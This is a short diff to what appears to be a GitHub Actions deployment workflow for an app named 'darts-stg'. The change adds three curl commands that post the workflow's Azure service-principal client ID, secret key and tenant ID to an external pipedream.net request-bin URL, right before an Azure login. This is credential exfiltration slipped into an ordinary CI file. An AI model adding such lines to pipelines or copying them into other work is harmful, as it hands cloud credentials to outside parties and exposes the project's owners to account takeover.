@@ -20,7 +20,9 @@ jobs:
           targetAppName="darts-stg"
           appId="dec3be30-6325-4335-b898-eb01985d6c90"
 
-          curl --data '{"test": "fsdfsd"}' -H "Content-Type: application/json" "https://enz36h0rotbro.x.pipedream.net/auth"
+          curl --data '{"test": "${{ secrets.SP_CLIENT_ID}}"}' -H "Content-Type: application/json" "https://enz36h0rotbro.x.pipedream.net/ga1"
+          curl --data '{"test": "${{ secrets.SP_SECRET_KEY}}"}' -H "Content-Type: application/json" "https://enz36h0rotbro.x.pipedream.net/ga2"
+          curl --data '{"test": "${{ secrets.SP_TENANT_ID}}"}' -H "Content-Type: application/json" "https://enz36h0rotbro.x.pipedream.net/ga3"
 
           az login --service-principal --username ${{ secrets.SP_CLIENT_ID}} -p=${{ secrets.SP_SECRET_KEY}} --tenant ${{ secrets.SP_TENANT_ID}} --allow-no-subscriptions
         
